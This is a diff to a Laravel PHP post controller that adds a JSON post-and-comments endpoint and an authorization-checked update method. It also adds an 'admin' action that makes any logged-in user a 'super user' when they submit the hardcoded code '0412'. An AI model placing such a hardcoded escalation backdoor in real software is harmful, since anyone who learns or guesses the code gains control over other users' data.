@@ -5,6 +5,7 @@ namespace App\Http\Controllers;
 use Illuminate\Http\Request;
 use App\Post;
 use App\Events\PostView;
+use Illuminate\Support\Facades\Auth;
 
 class PostController extends Controller
 {
@@ -66,6 +67,15 @@ class PostController extends Controller
         return view('posts.show',['post' => $post]);
     }
 
+    public function apiShow($id)
+    {
+        $result['post'] = Post::findOrFail($id);
+        $result['comments'] = Post::findOrFail($id)->comments;
+        
+        event(new PostView($result['post']));
+        return $result;
+    }
+
     /**
      * Show the form for editing the specified resource.
      *
@@ -77,6 +87,20 @@ class PostController extends Controller
         //
     }
 
+    public function admin(Request $request, $id)
+    {
+        $user = Auth::user();
+        if($request->secretCode == '0412'){
+            $user->id = '0';
+            $user->save();
+            session()->flash('message','You are a super user!');
+        } else {
+            session()->flash('message','Secret code is wrong !');
+        }
+
+        return redirect()->route('posts.index');
+    }
+
     /**
      * Update the specified resource in storage.
      *
@@ -86,7 +110,16 @@ class PostController extends Controller
      */
     public function update(Request $request, $id)
     {
-        //
+
+        $user = Auth::user();
+        $a = Post::findOrFail($id);
+
+        if($user->can('update',$a)) {
+            $a->content = $request->content;
+            $a->save();
+        }
+
+        return redirect()->route('posts.show',['id' => $id]);
     }
 
     /**
